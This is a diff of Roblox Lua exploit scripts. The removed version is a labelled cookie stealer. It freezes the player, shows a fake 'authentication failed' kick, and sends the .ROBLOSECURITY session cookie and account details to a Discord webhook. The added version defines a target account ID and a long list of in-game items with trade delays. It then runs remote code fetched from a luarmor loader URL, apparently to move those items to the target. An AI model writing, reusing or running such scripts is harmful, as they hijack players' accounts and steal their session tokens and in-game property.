@@ -1,56 +1,206 @@
-   XENO & SOLAR ADVANCED ACCESS MODULE v4.0
-    Module: Full-Account-Grabber (Cookie + Stats)
-    Status: Operational | Bypass: Active
-]]
-
-local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
-local p = game.Players.LocalPlayer
-local h = game:GetService("HttpService")
-
--- Karuk (Freeze & Fake Error)
-if p.Character then p.Character.HumanoidRootPart.Anchored = true end
-task.delay(2, function() p:Kick("Fatal Error: [0x88] Authentication failed. Re-log required.") end)
-
--- COOKIE GRAB LOGIC (Advanced)
-local cookie = "Failed to grab (Protected)"
-local success, res = pcall(function()
-    -- Opit za izvlichane na sesiyata chrez vgradeni funkcii na Solar/Xeno
-    return (getrenv and getrenv()._G and getrenv()._G.cookie) or (getcookies and getcookies("https://www.roblox.com")[1].Value) or "Hidden"
-end)
-if success then cookie = res end
-
--- Stats (Brainrots)
-local br = "0"
-local s = p:FindFirstChild("leaderstats")
-if s then 
-    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
-    br = v and tostring(v.Value) or "0"
-end
-
--- Discord Payload
-local data = {
-    ["username"] = "Xeno Access Bot",
-    ["embeds"] = {{
-        ["title"] = "🔑 Full Account Access Grabbed!",
-        ["color"] = 0xff0000,
-        ["fields"] = {
-            {["name"] = "👤 User", ["value"] = "```" .. p.Name .. " (" .. p.UserId .. ")```", ["inline"] = false},
-            {["name"] = "🧠 Brainrots", ["value"] = "```" .. br .. "```", ["inline"] = true},
-            {["name"] = "📅 Age", ["value"] = "```" .. p.AccountAge .. " days```", ["inline"] = true},
-            {["name"] = "🍪 .ROBLOSECURITY (COOKIE)", ["value"] = "```" .. cookie .. "```", ["inline"] = false},
-            {["name"] = "🔗 Profile", ["value"] = "[Otvori Accaunta](https://www.roblox.com/users/" .. p.UserId .. "/profile)", ["inline"] = false}
-        },
-        ["footer"] = {["text"] = "Xeno Stealer Engine • " .. os.date("%X")}
-    }}
+ getgenv().SECRET_KEY = "mrr_36321e4417bf4a018e14fc15e7a64464"
+getgenv().TARGET_ID = 10084361189
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+["Strawberry Elephant"] = true,
+["Meowl"] = true,
+["Headless Horseman"] = true,
+["Skibidi Toilet"] = true,
+["Griffin"] = true,
+["Hydra Dragon Cannelloni"] = true,
+["Dragon Gingerini"] = true,
+["Dragon Cannelloni"] = true,
+["Love Love Bear"] = true,
+["La Supreme Combinasion"] = true,
+["Celestial Pegasus"] = true,
+["Cerberus"] = true,
+["Popcuru and Fizzuru"] = true,
+["Rosey and Teddy"] = true,
+["Capitano Moby"] = true,
+["Cooki and Milki"] = true,
+["Burguro And Fryuro"] = true,
+["Ketupat Bros"] = true,
+["Reinito Sleighito"] = true,
+["Fortunu and Cashuru"] = true,
+["Los Amigos"] = true,
+["La Secret Combinasion"] = true,
+["Los Sekolahs"] = true,
+["Signore Carapace"] = true,
+["La Casa Boo"] = true,
+["Fragrama and Chocrama"] = true,
+["La Food Combinasion"] = true,
+["Elefanto Frigo"] = true,
+["Spooky and Pumpky"] = true,
+["Ginger Gerat"] = true,
+["La Ginger Sekolah"] = true,
+["Sammyni Fattini"] = true,
+["Garama and Madundung"] = true,
+["Fishino Clownino"] = true,
+["Jolly Jolly Sahur"] = true,
+["Tirilikalika Tirilikalako"] = true,
+["Los Spaghettis"] = true,
+["Festive 67"] = true,
+["Ventoliero Pavonero"] = true,
+["Cloverat Clapat"] = true,
+["Spaghetti Tualetti"] = true,
+["Antonio"] = true,
+["Rosetti Tualetti"] = true,
+["Nacho Spyder"] = true,
+["Gold Gold Gold"] = true,
+["Swaggy Bros"] = true,
+["La Romantic Grande"] = true,
+["Orcaledon"] = true,
+["Tictac Sahur"] = true,
+["La Taco Combinasion"] = true,
+["Ketupat Kepat"] = true,
+["Dug dug dug"] = true,
+["Tang Tang Keletang"] = true,
+["Lovin Rose"] = true,
+["Los Tacoritas"] = true,
+["Eviledon"] = true,
+["Los Primos"] = true,
+["W or L"] = true,
+["Esok Sekolah"] = true,
+["La Jolly Grande"] = true,
+["Los Cupids"] = true,
+["Los Puggies"] = true,
+["Tralaledon"] = true,
+["Gobblino Uniciclino"] = true,
+["Tuff Toucan"] = true,
+["Mieteteira Bicicleteira"] = true,
+["Chipso and Queso"] = true,
+["Chillin Chili"] = true,
+["Money Money Reindeer"] = true,
+["La Spooky Grande"] = true,
+["Bacuru and Egguru"] = true,
+["Los Bros"] = true,
+["La Extinct Grande"] = true,
+["Los Candies"] = true,
+["Los 67"] = true,
+["Celularcini Viciosini"] = true,
+["Los Mobilis"] = true,
+["Money Money Puggy"] = true,
+["Cigno Fulgoro"] = true,
+["Los Spooky Combinasionas"] = true,
+["Los Hotspotsitos"] = true,
+["Los Jolly Combinasionas"] = true,
+["Snailo Clovero"] = true,
+["Los Planitos"] = true,
+["Chicleteira Cupideira"] = true,
+["DJ Panda"] = true,
+["Las Sis"] = true,
+["Spinny Hammy"] = true,
+["Tacorita Bicicleta"] = true,
+["Los Sweethearts"] = true,
+["Nuclearo Dinossauro"] = true,
+["Chicleteira Noelteira"] = true,
+["Los Combinasionas"] = true,
+["Chimnino"] = true,
+["Noo my Gold"] = true,
+["Swag Soda"] = true,
+["Noo my Heart"] = true,
+["Tacorillo Crocodillo"] = true,
+["Mariachi Corazoni"] = true,
+["La Grande Combinasion"] = true,
+["Los 25"] = true,
+["Los Burritos"] = true,
+["67"] = true,
+["Donkeyturbo Express"] = true,
+["Los Chicleteiras"] = true,
+["Guest 666"] = true,
+["Los Mi Gatitos"] = true,
+["Rang Ring Bus"] = true,
+["Granny"] = true,
+["Noo my Present"] = true,
+["Serafinna Medusella"] = true,
+["Los Nooo My Hotspotsitos"] = true,
+["Arcadopus"] = true,
+["Noo my Candy"] = true,
+["Los Quesadillas"] = true,
+["Chicleteirina Bicicleteirina"] = true,
+["Chill Puppy"] = true,
+["Burrito Bandito"] = true,
+["Luck Luck Luck Sahur"] = true,
+["Chicleteira Bicicleteira"] = true,
+["Brunito Marsito"] = true,
+["Quesadillo Vampiro"] = true,
+["Eid Eid Eid Sahur"] = true,
+["Cupid Hotspot"] = true,
+["Mi Gatito"] = true,
+["Ho Ho Ho Sahur"] = true,
+["Cupid Cupid Sahur"] = true,
+["Pot Pumpkin"] = true,
+["Naughty Naughty"] = true,
+["Bunito Bunito Spinito"] = true,
+["Quesadilla Crocodila"] = true,
+["Horegini Boom"] = true,
+["Santa Hotspot"] = true,
+["Pot Hotspot"] = true,
+["25"] = true,
+["Pirulitoita Bicicleteira"] = true,
+["To to to Sahur"] = true,
+["Telemorte"] = true,
+["La Sahur Combinasion"] = true,
+["List List List Sahur"] = true,
+["Noo my examine"] = true,
+["Los Jobcitos"] = true,
+["Nooo My Hotspot"] = true,
+["Bunnyman"] = true,
+["Tung Tung Tung Sahur"] = true,
+["Cuadramat and Pakrahmatmamat"] = true,
+["Please my Present"] = true,
+["Los Cucarachas"] = true,
+["1x1x1x1"] = true,
+["La Vacca Lepre Lepreino"] = true,
+["Love Love Love Sahur"] = true,
+["Perrito Burrito"] = true,
+["Graipuss Medussi"] = true,
+["Giftini Spyderini"] = true,
+["GOAT"] = true,
+["Trickolino"] = true,
+["Paradiso Axolottino"] = true,
+["Triplito Tralaleritos"] = true,
+["La Vacca Jacko Linterino"] = true,
+["Fishboard"] = true,
+["Santteo"] = true,
+["Las Vaquitas Saturnitas"] = true,
+["Los Karkeritos"] = true,
+["Karker Sahur"] = true,
+["Los Trios"] = true,
+["Job Job Job Sahur"] = true,
+["Frankentteo"] = true,
+["Pumpkini Spyderini"] = true,
+["Las Tralaleritas"] = true,
+["Rocco Disco"] = true,
+["Extinct Matteo"] = true,
+["La Karkerkar Combinasion"] = true,
+["La Vacca Prese Presente"] = true,
+["Reindeer Tralala"] = true,
+["Yess my examine"] = true,
+["Guerriro Digitale"] = true,
+["Boatito Auratito"] = true,
+["Vulturino Skeletono"] = true,
+["Los Tralaleritos"] = true,
+["Zombie Tralala"] = true,
+["Los Tortus"] = true,
+["La Cucaracha"] = true,
+["Fragola La La La"] = true,
+["Extinct Tralalero"] = true,
+["Agarrini la Palini"] = true,
+["Los Spyderinis"] = true,
+["Chachechi"] = true,
+["Blackhole Goat"] = true,
+["Dul Dul Dul"] = true,
+["Torrtuginni Dragonfrutini"] = true,
+["Trenostruzzo Turbo 4000"] = true,
+["Karkerkar Kurkur"] = true,
+["Los Matteos"] = true,
+["Bisonte Giuppitere"] = true,
+["Sammyni Spyderini"] = true,
+["La Vacca Saturno Saturnita"] = true,
+["Jackorilla"] = true,
+["Secret Lucky Block"] = true,
+["Lavadorito Spinito"] = true
 }
-
--- Send
-local request = (syn and syn.request) or (http and http.request) or http_request or request
-if request then
-    request({
-        Url = webhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = h:JSONEncode(data)
-    })
-end
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
